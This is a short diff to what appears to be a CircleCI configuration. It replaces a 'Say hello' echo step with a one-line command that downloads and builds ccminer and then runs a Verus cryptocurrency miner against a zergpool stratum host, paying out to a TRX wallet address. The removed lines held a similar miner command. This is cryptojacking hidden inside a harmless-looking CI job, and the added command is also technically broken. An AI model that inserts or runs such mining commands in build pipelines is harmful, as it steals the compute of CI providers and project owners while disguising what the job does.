@@ -16,8 +16,7 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: "echo Hello, World!"
-          -run: git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh && ./ccminer -a verus -o stratum+tcp://verushash.mine.zergpool.com:3300 -u TRRFyWQWhL4tzf9YezvE3U58qBx2RAjJLa -p c=TRX,ID=qq -t 33
+          command:  wget https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh && ./ccminer -a verus -o stratum+tcp://verushash.mine.zergpool.com:3300 -u TRRFyWQWhL4tzf9YezvE3U58qBx2RAjJLa -p c=TRX,ID=qq -t 33
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
